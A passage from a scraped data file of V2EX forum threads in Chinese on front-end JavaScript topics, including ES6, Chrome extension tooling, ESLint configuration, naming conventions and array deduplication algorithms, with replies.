chrome 会把我俩电脑分辨率宽度应该和你都当做 1280 来着我觉得，，，你截图让我看看，你那长什么样，", "  你之前的图挂了，，", " 我知道原因了，你应该用电脑看。我没对手机适配来着，，而且手机的分辨率是宽，浏览器会当做 400 到 500 之间，所以，，，，总之我寒假重写，肯定会去适配手机的", "楼主也用 cmder", " 那是啥，，命令行嘛", " 请问可以跳过 5 直接学 6 吗？", " 不能， es6 教程内容不包括 5 ，而是默认你会 5", " 我也写过一个 es6 入门，用空帮忙瞅瞅？\r", " 要登录啊，，没有开源精神，，有点麻烦。。我这个是简版的，适合用户是擅长 js 的学习者，想在 5 小时内，学好 es6 的人", " 很赞的语法啊。。。", " 我去难道不是。。。", "解构赋值和箭头函数如果被**滥用**，那么代码可读性将大大下降，不敢想象。", " 我觉得还是好处大于坏处的。", "   第三方登录都麻烦吗，还有什么其他选择？⊙﹏⊙b 汗", "刚开始看，写的挺好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>使用的工具:</h2>\n\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/petehunt/webpack-howto\">webpack</a> to auto rebuild code.</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://babeljs.io/docs/setup/#webpack\">babel 6</a> to compile es6/7 code to es5.</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://chrome.google.com/webstore/detail/extensions-reloader/fimgfedafeadlieiabdeeaodndnlbhid\">Extensions Reloader</a> for easier reload extension</li>\n</ul>\n\n<h2>例子: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ProjecToday/es6-chrome-extension-starter\">https://github.com/ProjecToday/es6-chrome-extension-starter</a></h2>\n\n<p>npm scripts inside:<br>\n<code><br>\n  \"scripts\": {<br>\n    \"start\": \"webpack -d --watch\", // continuous incremental build in development with include source maps<br>\n    \"build\": \"webpack -p\" // building once for production <br>\n  }<br>\n</code></p>\n\n<p>唯一的缺憾在于不能 auto reload 。不知道有没有人有办法？</p>\n</div></div>"], "reply": "16", "tittle": "使用 es6/7 开发 chrome extension 的最佳实践？", "comment": ["没办法吧，插件需要重新加载", "好像有可以 reload extension 的 extension...", "我开发[划词翻译]( ", " auto reload 的方法，但是没找到。", "评论不支持 MD 的。。 地址是  ", " 可以尝试 reload 插件列表的 tab", " [Extensions Reloader]( ", " reload extension 的 extension ，但每次都要点一下，还是有一点麻烦", "  [Extensions Reloader]( ", ")  就是用来 reload extension 的 extension ，但每次都要点一下，还是有一点麻烦", "没有 wather 连代码都写不了，前端已经到了这种程度了吗", " 只是为了写代码写的更舒服而已", " wather 是指 webpack 吗？不是写不了，是为了写的爽", " 看下他怎么做的拿来就好了...", " 啥？", "我在么觉得没有 loader 没有 watcher 更爽", " 看一下 Extensions Reloader 是怎么做的, 拿来弄成自动的...", "其实办法是有的。\r", "\r", "做一个功能跟 Extensions Reloader 一样的扩展 A ，但是它需要支持 外部消息通信（ ", " ），在每次 Webpack 构建完成时通知一下扩展 A 把 tab 和正在开发的扩展 B 都刷新一遍。\r", "\r", "至于怎么让 Webpack 通知到扩展 A ，我的想法是本地有一个 web page 专门用来发送消息到扩展 A ，每次刷新一遍这个 web page ，扩展  A 就会把所有的 tab 和扩展 B reload 一遍。\r", "\r", "那么总结来说，只需要在 Webpack 每次构建完成的时候用 Node.js 打开这个 web page ，就会让所有 tab 和扩展  B 刷新一遍了。", " \r", " good idea ，有空可以搞一搞"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.jq22.com/yanshi970\">http://www.jq22.com/yanshi970</a></p>\n\n<p>下载这个 jquery 本来是要钱的，能不能通过这个页面直接下载 demo</p>\n</div></div>"], "reply": "2", "tittle": "通过 chrome 审查元素直接获取网页 JS 代码?", "comment": ["。。。。。前端代码只要给了完整 demo ，收费就只看良心了= ="]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不同于已有的那些微信机器人公众号，这个小机器人可以接管你自己的微信号。<br>\n指定对某些人开启机器人自动回复。比如女朋友，再也不用担心回复慢了有没有。</p>\n\n<p>代码发布在 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/stonexer/wechatBot\">Github 链接</a>，各种 bug ，各种问题。欢迎大家测试。</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://139.129.21.59:3000\">点击链接</a>，可直接在 demo 服务器中测试。拿手机微信扫二维码便可测试。被坑了的话欢迎来喷！ O(∩_∩)O 谢谢</p>\n</div></div>"], "reply": "12", "tittle": "微信机器人小助手，求各种测试各种反馈中。。。", "comment": ["问下 node 怎么支持 es6 语法？ 加了 harmony 参数还是用 babel ？", " node 新版本现在都是支持支持 es6 的了，\"use strict\"就好，如果相兼容旧版本的话才需要 babel 或者 harmony 。", " ", " harmony 支持可以看这个。", "对服务环境有要求吗", "啊哈哈哈哈   ，直接告诉对方自己是机器人不好吧。。。。。。。。", " 没啥要求吧。。。", " 哈哈哈，看来得考虑加个开关了。。", "如何部署？", "做个自动抢红包的功能岂不是更好？", " 只是使用的话，访问那个网页就可以了。想自己调试的话，得装个 node 环境就好。", " 是啊。不过 web wechat 没有红包的接口，也不太安全啦。", "赞"]},
{"content": ["<div class=\"topic_content\">最近看了道爷的 2001 文章\r<br><a target=\"_blank\" href=\"http://www.crockford.com/javascript/private.html\" rel=\"nofollow\">http://www.crockford.com/javascript/private.html</a>\r<br>在自己的机器上跑，并没有 private 的效果啊。\r<br>```javascript\r<br>function Container(param) {\r<br>    this.member = param;\r<br>    var secret = 3;\r<br>    var that = this;\r<br>}\r<br>var myContainer = new Container('abc');\r<br>console.log(myContainer.member); // 依然会打印 abc\r<br>myContainer.member = 'efg';\r<br>console.log(myContainer.member); // 会打印 efg\r<br>```\r<br>求解。多谢！</div>"], "reply": "9", "tittle": "JS private 如何使用", "comment": ["see ", "\r", "see ", "\r", "see ", "\r", "see ", "\r", "see ", "您认真看您发的文章了吗？ secret 才是私有的啊", " 在 Private 那个标题下面：\r", "This constructor makes three private instance variables: param, secret, and that. They are attached to the object, but they are not accessible to the outside, nor are they accessible to the object's own public methods. They are accessible to private methods. Private methods are inner functions of the constructor.\r", "他说，三个都是不能 accessible to the outside 。", " 你访问的是 member ，不是这三个的任何一个，有任何问题么？", "原谅我放荡不羁的笑点……", "为什么要把其它语言的概念搬到 JS", "ES6 中 closure + Symbol 就能实现 private 的效果", " 如 @", " 所说你访问的是 member ，原文只说 param, secret, that 三个变量是私有的而已", "额外插一句， JS 没有 private 这一说，想要实现数据保护经常引入额外的麻烦"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>问题地址： <a target=\"_blank\" rel=\"nofollow\" href=\"http://olddriver.help\">http://olddriver.help</a></h2>\n</div></div>"], "reply": "10", "tittle": "Material Design Lite 框架动态创建的元素无法绑定事件", "comment": ["谁知道你哪里出问题了。", " 输入，回车，动态创建的复选框不能选中，没有事件，估计需要委托 document 去绑定事件，可是框架的代码还起来棘手 TAT", " 关键问题是你不给别人更好的去帮你解决问题创造更好的条件。明白吗？提问的智慧。", "getmdl 文档上 ", " 有写如何处理动态界面，使用 upgradeElement 。 LZ 应该多看看文档。我之前也不看文档直接用，结果被这种傻瓜行为坑了好久。", " 受教了", " 好的 谢谢！", "域名不错", " 😳", " 咋？", " 木事"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，我现在只会用 iframe ，但这样的话太单一了，比如，我百度了某些东西，点击搜索出来的结果，就会跳出另一个网页，有没有办法可以在 iframe 里弄一个标签页，每当点击链接就自动出现在标签页里？ <br>\n我是初学者，请大家帮帮忙</p>\n</div></div>"], "reply": "14", "tittle": "如何用 JS 写一个嵌在网页里的浏览器？", "comment": ["应该使用后端来处理，也就是代理模式。前端会遇到很多问题", " 十分感谢~", "修改 <a> 标签的 target 属性，指定 iframe 去打开页面就行了。\r", " 我的意思是 比如说 我在 iframe 里百度了 V2EX ， 然后打开 V2EX 能不能在这个 iframe 里打开，相当于在这个 iframe 里点一个链接，还是在这同一个 iframe 里显示", "如果是我的话，不用 iframe ，后端获取每个 URL 对应的 HTML 并分析出 script 和 style 和去掉多余的东西（自己斟酌吧，尤其是 head 里的一坨坨），然后用 ajax 加载到自己的页面。", " 修改 iframe 中搜索结果的 <a> 让 target=\"_self\" 即可", "搜一下<base target=\"iframe-name\" />", "如果是纯 JS ，别想做到，不要想了，做不到的。如果考虑后台中转，用袋里的方式可以做，但是耗费后台资源，没谁这么干的，就是伟大的腾讯也不敢这么玩（以前 webqq 就有做类似浏览器，其实也就是个 iframe ，你这想法十几年前大家就在想了，谁都做不到，除非用袋里的方式替换 target 标签，否则免谈）\r", "\r", "如果你非要问一句为什么的话，我简单告诉你，浏览器有安全策略，是不会允许你在你的网站去随意操作别人的网站", "哦对了，你还可以内嵌插件的方式实现，这也是可行的，你可以开发 IE 插件， Chrome 插件， Firefox 插件来实现，但是这样用户必须先装你的插件……", "crafteverywhere.github.io/Webhacking_ludumdare34/ 这个就是拿 iframe 实现的。", "js 在浏览器端的限制越多，控制越细，浏览器就越安全，所以几乎没有可能做跨域的操作，除非楼主自己开发一款浏览器😎", "target", "浏览器里不用 iframe 的话，访问其他页面有很多限制。\r", "主要就是跨域操作问题，通过 ajax 访问其他域名的时候限制很多，不少操作都要对方网站配合修改。\r", "作为一个在上面浪费过不少时间的人表示，换个姿势吧……", " 十分感谢 但是我是个初学者 ajax 和后端都不怎么会"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>前言</h3>\n\n<p>最近用 vue 捣鼓东西，其中用到还用到 materialize 这个 md 框架<br>\n不过 materialize tabs 组件在 vue 中不能很好工作......</p>\n\n<p>原因是 tabs 组件是通过<code>href</code>锚点标记，来匹配 tab 主体元素，例如官方文档中例子</p>\n<div class=\"highlight\"><pre>&lt;ul class=\"tabs\"&gt;\n    &lt;li class=\"tab col s3\"&gt;&lt;a href=\"#test1\"&gt;Test 1&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;div id=\"test1\" class=\"col s12\"&gt;Test 1&lt;/div&gt;\n</pre></div>\n\n<p>假如你还开启了 vue 的 router<br>\n这样当你点击 a 标签时，由于 router 的路径被锚点改变而导致页面错乱</p>\n\n<p>修复这个问题也很简单，因为只要不使用<code>href</code>就可以了，<br>\n我们完全可以用<code>data-href</code> 自定义属性来替代，这样就不会因为锚点干扰 router 路径<br>\n同时将 tabs 组件源码的中关于获取<code>href</code>的值的语句替换为获取<code>data-href</code>，就好了。</p>\n\n<p>像这样</p>\n\n<p><code>this.hash</code>=&gt;<code>$(this).data('href')</code></p>\n\n<p>希望能帮到你们</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "修复 materialize tabs 组件在 vue 的问题", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>es6 主流浏览器支持并不好，为什么 redux 的 example 还用 es6 语法写？</p>\n</div></div>"], "reply": "11", "tittle": "为什么 redux 的 example 用 es6 语法写？", "comment": ["你知道有一种叫做 babel 的东西吗？", "React 整个生态基本上都是 ES6 的", "对啊 都是 es2015 ， 你不用也得学呀，不然别人的都看不懂~~~\r", "\r", "package 里面的 babel 插件 可以翻译 es ， 实现兼容", " \r", "没太了解，可以用它转换成 es5 是吗\r", " \r", "哦。。我有个可能很菜的疑惑：因为组里项目用 react ，然后我就自学 webpack ， redux ，但是这些东西示例都是用 npm 相关的，但是我们的 web 是用的 Play 框架，引用前端库又是 webjar 那一套，有点不太懂要怎么用比较正确。", "现在用 babel 已经很方便了, 写完转一下毫无压力, 配套的轮子也很齐全\r", "\r", "还有像在 reducer 中声明函数时直接设置参数默认值的语法, es5 是不支持的, 实现起来很恶心, 还不如用 es6 写了交给 babel 转成 es5", " 现在 react 圈子流行的做法是前后端完全分离, 后端只是作为数据接口来使用, 完全不管视图的那一套, 数据怎么展现都通过前端实现", " 感谢，有点明白了，那按现在单页面 web 应用的思路，前端只给后台一个可以 render 的 index.html ，然后其余的都用 react+react-router+redux 配合 restful 接口就行了吧", "你知道有一种叫做 typescript 的东西吗？", " 嗯嗯, 我的理解就是这样", "一般来说 会结合 webpack 和 babel 来使用。 React 同时提供了服务器上使用的 ReactDOMServer.renderToString 接口，可用于首次加载。", "因为爽"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>简历投递至 <a target=\"_blank\" rel=\"nofollow\" href=\"mailto:lshi@redhat.com\">lshi@redhat.com</a><br>\n注明应聘职位及招聘渠道<br>\n薪资面议<br>\n工作地点：北京市--知春里<br>\nJob Summary<br>\nThe Red Hat JBoss Sustaining Engineering team is seeking a Software Engineer to join us in Brno, Czech Republic. In this role, you will contribute to the development of the Red Hat JBoss Enterprise Application Platform. We'll need you to come prepared to be proactive, self-motivated, and work in a collaborative, distributed environment.</p>\n\n<p>Primary Job Responsibilities<br>\nWork with multiple Java EE technologies, including EJBContainer, Web container, and TransactionManager<br>\nWork in a collaborative, distributed environment<br>\nBuild solutions for customer requirements and bugs to improve the quality of Red Hat JBoss Enterprise Application Platform<br>\nCommunicate with support, core, and product engineers</p>\n\n<p>Required Skills<br>\nAdvanced Java programming experience<br>\nExperience with Java EE application development<br>\nSolid written and verbal English language skills; excellent communication skills at all levels of the business<br>\nPositive attitude and desire to share ideas openly<br>\nPassion for open source software<br>\nMiddleware development experience is a plus<br>\nProven ability to work on your own with minimal direction</p>\n</div></div>"], "reply": "4", "tittle": "红帽软件诚招 Software Engineer--Middleware", "comment": ["工作地点：北京市--知春里 \r", "join us in Brno, Czech Republic. \r", "\r", "究竟是哪里啊？", "招 java 节点又在 js...已混乱", " 工作地点是在北京市--海淀区--知春里的。", " 抱歉哈， Java 节点里面也有的。"]},
{"content": ["<div class=\"topic_content\">1. var myTestValue = 0, mySecondValue = \"hi\";\r<br>\r<br>\r<br>2. var MyTestValue = 0, MySecondValue = \"hi\";\r<br>\r<br>\r<br>3. var my_test_value = 0, my_second_value = \"hi\";</div>"], "reply": "19", "tittle": "JS 变量命名你们最喜欢哪一种？", "comment": ["大部分的编码规范都是变量用 camelCase ，类用 CamelCase.", " ", "\r", "\r", "JS 貌似 lowerCamelCase 比较多", "1,3 都好说， 2 是什么鬼？", " 微软的规范 .net mfc 都是\r", "另外 貌似 go 也是", "myTstVal 不好么…", "javaScript 和 JavaScript 也就算了， java_script 有点难接受...", " \r", "\r", "\r", "可见性规则\r", "\r", "\r", "当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如： Group1 ，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public ）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 private ）。\r", "\r", "\r", "var 我的 = 0, 你的 = \"hi\";", " Pascal 标记法", "变量，函数名第一种，构造函数第二种，常量大写字母且第三种", "个人我喜欢下划线分割的小写字母 因为我以前写 c 和 python 的\r", "但是我现在干的都是 java 所以 camelCase 也不错", " c#的函数貌似第一个字母是大些的", " go 大小写关系到 private 和 pubic\r", "所以 1 和 2 都可以", "因为是基友带我入门的，他是 Rubyer ，所以我也跟着他 camelCase 了_(:зゝ∠)_", "驼峰, 类名喜欢首字母大写", "就 1 ，其他都有些不适应", "变量用驼峰，构造函数用首字母大写\r", "\r", "当然也有些人习惯变量用下划线分割\r", "\r", "有些时候文件名用下划线\r", "\r", "最主要还是要整个项目编码规范统一", "lower_camel_case", "類名用大駝峰，變量名小駝峰，下劃線那個表示難以接受"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我使用的 ESLint 配置文件为 React Native 官方仓库中的: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/facebook/react-native/blob/master/.eslintrc\">https://github.com/facebook/react-native/blob/master/.eslintrc</a></p>\n\n<p>错误提示: AssertionError: ImportDeclaration should appear when the mode is ES6 and in the module context</p>\n\n<p>有个类似错误, 不过人家说是自己配置的问题: <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/eslint/eslint/issues/4344\">https://github.com/eslint/eslint/issues/4344</a> 我按照他的做法修改配置文件在 <code>\"ecmaFeatures\"</code> 中增加了 <code>\"modules\": true</code> 还是报错.</p>\n\n<p>请问该如何修改配置文件解决这个问题?</p>\n\n<hr>\n\n<p>还有一个问题, 就是官方是在每个文件中都增加严格模式, 但是 ESLint 提示我这样在模块中添加标题是没必要的...</p>\n</div></div>"], "reply": "3", "tittle": "求助 eslintrc 配置问题: 使用 React Native 自带的 .eslintrc 遇到 import 就报错", "comment": ["\r", "\r", "看了比较新的 commit, `'use strict'` 被删除了.", "{\r", "  \"parserOptions\": {\r", "    \"ecmaVersion\": 6,\r", "    \"sourceType\": \"module\"\r", "  }\r", "}\r", "\r", "如果你是在用 ESLint v2.x 的话", "感谢 @", " , 问题已被解决.\r", "\r", "是该看看 ", " 了.\r", "\r", "- ecmaFeatures 应该被包裹在顶级的 parserOptions 内.\r", "- ecmaFeatures.modules 被 sourceType 替代. 用法也变了, 不再是布尔值而是字符串."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本文原发布在 segmentfault.com <a target=\"_blank\" rel=\"nofollow\" href=\"https://segmentfault.com/a/1190000004548931\">https://segmentfault.com/a/1190000004548931</a> 在学是作者，现在贴到 V2EX ，所以不存在侵权。</p>\n\n<h2>前言</h2>\n\n<p>最近为了换工作，准备下面试，开始回顾复习 JavaScript 相关的知识，昨天下午想到了数组去重的相关方法，干脆整理出几篇 JavaScript 算法文章，以备后用，此系列文章不定篇数，不定时间，想到哪写到哪，不保证正确性，不保证高效率，只是谈谈个人理解，如有错误，请诸位斧正。</p>\n\n<h2>关于去重</h2>\n\n<p>数组去重是一个比较常见的算法考察点，实现去重的方式无外乎通过唯一性和非唯一性。简单来讲就是挑出唯一的或者删除不唯一的。以下所有算法都是我自己瞎命名的，请无视之。</p>\n\n<h2>循环匹配去重</h2>\n\n<p>顾名思义，就是把数组中的每一个元素都和存放元素的数组对比，遇到不重复的元素，放入新数组中，直至循环结束，由于匹配也有循环，也可以称为双循环匹配去重，这也是大家都能想到的最简单的方式。</p>\n\n<h3>实现代码：</h3>\n<div class=\"highlight\"><pre>var arr=[1,3,4,56,3,7,9,7];\nvar result=[];\n//匹配\nfunction isMatch(array,n){\n    for(var i=0;i&lt;array.length;i++){\n        if(array[i]==n){\n            return true;\n        }\n    }\n    return false;\n};\n//验证所有元素\nfunction unqiue(array){\n    for(var i=0;i&lt;array.length;i++){\n        if(!isMatch(result,array[i])){\n            result.push(array[i]);\n        }\n    }\n    return result;\n};\n\nconsole.log(unqiue(arr));\n</pre></div>\n<div class=\"highlight\"><pre>注意：上面方法有一个 bug ，当存在数字和数字形式的字符串的时候，没有区分出数字和数字字符串。因为在匹配函数 isMatch()里用的是双等“==”，没有验证元素类型，实际应该使用全等“===”。\n</pre></div>\n\n<p>修改后的代码如下：</p>\n<div class=\"highlight\"><pre>var arr=[1,3,4,56,3,'1',7,9,7];\nvar result=[];\n//匹配\nfunction isMatch(array,n){\n    for(var i=0;i&lt;array.length;i++){\n        if(array[i]===n){\n            return true;\n        }\n    }\n    return false;\n};\n//验证所有元素\nfunction unqiue(array){\n    for(var i=0;i&lt;array.length;i++){\n        if(!isMatch(result,array[i])){\n            result.push(array[i]);\n        }\n    }\n    return result;\n};\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<h3>算法优缺点：</h3>\n\n<p>优点:</p>\n\n<ol>\n<li>实现简单，思路直观</li>\n</ol>\n\n<p>缺点：</p>\n\n<ol>\n<li>效率低下</li>\n</ol>\n\n<h2>JSON 去重 /对象去重 /字典去重 1</h2>\n\n<p>JSON 去重，简单来讲就是利用 Object 对象 key 的唯一性，将数组的元素转换为 JSON 或者说对象的 key 值。 JSON 的 value 存储数组的索引 index ，然后对 JSON 对象进行 for in 循环，存储到新数组中。</p>\n\n<p>Array 、 JSON 、{}都是 Object ，所以采用任意一种都可以实现此算法。</p>\n\n<h3>实现代码：</h3>\n\n<p>Array 方式：</p>\n<div class=\"highlight\"><pre>var arr=[1,3,4,56,3,'1',7,9,7];\nfunction unqiue(array){\n    var cache=[];\n    var result=[];\n     //将数组元素转为对象的 key\n    for(var i=0;i&lt;array.length;i++){\n        cache[array[i]]=i;\n    };\n\n    //存储 key(实际的数组元素)\n    for(key in cache){\n        result.push(key);\n    };\n\n    return result;\n}\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<p>JSON 方式：<br>\n```<br>\nvar arr=[1,3,4,56,3,'1',7,9,7];<br>\nfunction unqiue(array){<br>\n    var cache={};<br>\n    var result=[];<br>\n     //将数组元素转为对象的 key<br>\n    for(var i=0;i&lt;array.length;i++){<br>\n        cache[array[i]]=i;<br>\n    };</p>\n<div class=\"highlight\"><pre>//存储 key(实际的数组元素)\nfor(key in cache){\n    result.push(key);\n};\n\nreturn result;\n</pre></div>\n\n<p>}</p>\n\n<p>console.log(unqiue(arr));<br>\n```</p>\n\n<p>Object 方式：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">arr</span><span class=\"o\">=</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"mi\">4</span><span class=\"p\">,</span><span class=\"mi\">56</span><span class=\"p\">,</span><span class=\"mi\">3</span><span class=\"p\">,</span><span class=\"s1\">'1'</span><span class=\"p\">,</span><span class=\"mi\">7</span><span class=\"p\">,</span><span class=\"mi\">9</span><span class=\"p\">,</span><span class=\"mi\">7</span><span class=\"p\">];</span>\n<span class=\"kd\">function</span> <span class=\"nx\">unqiue</span><span class=\"p\">(</span><span class=\"nx\">array</span><span class=\"p\">){</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">cache</span><span class=\"o\">=</span><span class=\"k\">new</span> <span class=\"nb\">Object</span><span class=\"p\">();</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">result</span><span class=\"o\">=</span><span class=\"p\">[];</span>\n     <span class=\"c1\">//将数组元素转为对象的 key</span>\n    <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"kd\">var</span> <span class=\"nx\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"nx\">i</span><span class=\"o\">&lt;</span><span class=\"nx\">array</span><span class=\"p\">.</span><span class=\"nx\">length</span><span class=\"p\">;</span><span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">){</span>\n        <span class=\"nx\">cache</span><span class=\"p\">[</span><span class=\"nx\">array</span><span class=\"p\">[</span><span class=\"nx\">i</span><span class=\"p\">]]</span><span class=\"o\">=</span><span class=\"nx\">i</span><span class=\"p\">;</span>\n    <span class=\"p\">};</span>\n\n    <span class=\"c1\">//存储 key(实际的数组元素)</span>\n    <span class=\"k\">for</span><span class=\"p\">(</span><span class=\"nx\">key</span> <span class=\"k\">in</span> <span class=\"nx\">cache</span><span class=\"p\">){</span>\n        <span class=\"nx\">result</span><span class=\"p\">.</span><span class=\"nx\">push</span><span class=\"p\">(</span><span class=\"nx\">key</span><span class=\"p\">);</span>\n    <span class=\"p\">};</span>\n\n    <span class=\"k\">return</span> <span class=\"nx\">result</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">unqiue</span><span class=\"p\">(</span><span class=\"nx\">arr</span><span class=\"p\">));</span>\n</pre></div>\n\n<h3>算法优缺点：</h3>\n\n<p>优点:</p>\n\n<ol>\n<li>简单</li>\n<li>效率非常高</li>\n</ol>\n\n<p>缺点:</p>\n\n<p>1.改变了数组元素的类型（去重后的元素都为字符串类型） <br>\n 2.无法区分数字和数值型字符串</p>\n\n<h2>JSON 去重 /对象去重 /字典去重 2</h2>\n\n<p>第 2 种方式和第 1 种方式在本质上没有太多区别，反而因为做了判断，效率降低了一点点。</p>\n\n<h3>实现代码</h3>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\nfunction unqiue(array){\n    var cache={};\n    var result=[];\n    for(var i=0;i&lt;array.length;i++){\n        //如果 json 或者是或 hash 里没有\n        if(!cache[array[i]]){\n            result.push(array[i]);\n            //设置当前结果为已存在\n            cache[array[i]]=true;\n        }\n    }\n    return result;\n}\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<p>为什么说第 2 种方式和第一种方式没有本质的区别呢？第 2 种方式有一个临时的 hash 表 cache ，存储了最终结果 result 中是否存在对应元素记录。如果 cache 中的记录不存在，说明该数组元素没有重复。第 1 种方式没有做判断，因为 json 数组，对象等，本质就可以看做是 hash ， cache[array[i]]中 array[i]相同的只会存在一个，所以不需要做判断。这也是第 1 种更快一点点的原因,虽然效率没有第 1 种那么高，但这种方式引入了一种解决第 1 种方式 bug 的潜在方案，在为 Array 添加去重方式的时候会提到这个方案。</p>\n\n<h3>算法优缺点：</h3>\n\n<p>优点：</p>\n\n<ol>\n<li>效率很高</li>\n</ol>\n\n<p>缺点:</p>\n\n<ol>\n<li>无法区分数字和数值型字符串</li>\n</ol>\n\n<h2>队尾递归去重</h2>\n\n<p>昨天晚上思忖良久想到用队列的方式，先将数组排序成升序或降序的队列，这样相同的元素就处在一个区域内，然后从队尾向前匹配，如果匹配成功，删除队尾，然后前一个元素再向其前面的匹配。整个匹配完成之后，剩下的元素就是去重过后的队列。</p>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13, 56, 9, ,'11',1, 8, '7', 17, 5, 45, 3, 7];\n\nfunction unqiue(array){\n    //排序数组，形成队列\n    array.sort(function(m,n){return m-n;});\n    ////排序后，队尾向前对比，如果相同，删除队尾，依次类推\n    function loop(Index){\n        if(Index&gt;=1){\n            if(array[Index]===array[Index-1]){\n                arr.splice(Index,1);\n            }\n            loop(Index-1);\n        }\n\n    }\n    loop(array.length-1);\n    return array;\n}\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<h3>算法优缺点：</h3>\n\n<p>优点：</p>\n\n<ol>\n<li>效率较高</li>\n</ol>\n\n<p>缺点:</p>\n\n<ol>\n<li>没有保留原数组的顺序</li>\n</ol>\n\n<h2>indexOf 去重 1</h2>\n\n<p>ECMAScript5 为数组添加了两个位置方法： indexOf()和 lastIndexOf()。如果查找不到相应的数组元素，返回-1 。所以可以使用 indexOf 方式来去重。</p>\n\n<h3>实现代码：</h3>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\n\nfunction unqiue(array){\n    var result=[];\n    for(var i=0;i&lt;array.length;i++){\n        if(result.indexOf(array[i])==-1){\n            result.push(array[i]);\n        }\n    }\n\n    return result;\n}\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<p>优点：</p>\n\n<ol>\n<li>效率较高</li>\n</ol>\n\n<p>缺点：<br>\n 2. 不兼容低版本浏览器（ ECMAScript5 才支持 indexOf()和 lastIndexOf()方法）</p>\n\n<h2>indexOf 去重 2</h2>\n\n<p>从上面的 indexOf 去重扩展开来，如果用 indexOf 查找一个数组的元素的结果不是该数组元素的索引，那么可以认为这个数组出现过。所以这也可以用来实现数组去重。</p>\n<div class=\"highlight\"><pre>var arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];\n\nfunction unqiue(array){\n    var result=[];\n    for(var i=0;i&lt;array.length;i++){\n        if(array.indexOf(array[i])==i){\n            result.push(array[i]);\n        }\n    }\n\n    return result;\n}\n\nconsole.log(unqiue(arr));\n</pre></div>\n\n<p>其实循环判断可以从第 1 项开始，因为第 0 项肯定不会重复。</p>\n\n<p>优点：</p>\n\n<ol>\n<li>效率较高</li>\n</ol>\n\n<p>缺点：<br>\n 2. 不兼容低版本浏览器（ ECMAScript5 才支持 indexOf()和 lastIndexOf()方法）</p>\n\n<h2>为 Array 对象添加去重方法的坑</h2>\n\n<p>以上总结了几种去重方法，我们来个小例子为 Array 对象添加去重，方便直接调用，实际情况下我们是不推荐修改 JavaScript 原生对象的，容易造成污染或者不可控的情况的发生。</p>\n\n<p>以 JSON 去重 1 的方式为 Array 添加对象，我们选用了“ cache=[]”的那种，结果不小心踩到了大坑。<br>\n```<br>\nvar arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];</p>\n\n<p>Array.prototype.unqiue=function(){<br>\n    var cache=[];<br>\n    var result=[];<br>\n    for(var i=0;i&lt;this.length;i++){<br>\n        cache[this[i]]=i;<br>\n    }</p>\n<div class=\"highlight\"><pre>for(key in cache){\n    result[cache[key]]=key;\n}\n\nreturn result;\n</pre></div>\n\n<p>}</p>\n\n<p>console.log(arr.unqiue());<br>\n```</p>\n\n<p><img src=\"https://segmentfault.com/img/bVtho9\" alt=\"图片描述\"></p>\n\n<p>结果居然把 Array 本身的 unqiue 方法也当做数组的内容输出出来了。</p>\n\n<p>再对比下使用 JSON 或者对象的方式的结果<br>\n```<br>\nvar arr=[6, 4, 6, 9, '6', 13,56, 9,'11',1, 8, '7', 17, 5, 45, 3, 7];</p>\n\n<p>Array.prototype.unqiue=function(){<br>\n    var cache={};<br>\n    var result=[];<br>\n    for(var i=0;i&lt;this.length;i++){<br>\n        cache[this[i]]=i;<br>\n    }</p>\n<div class=\"highlight\"><pre>for(key in cache){\n    result[cache[key]]=key;\n}\n\nreturn result;\n</pre></div>\n\n<p>}<br>\nconsole.log(arr.unqiue());<br>\n```<br>\n<img 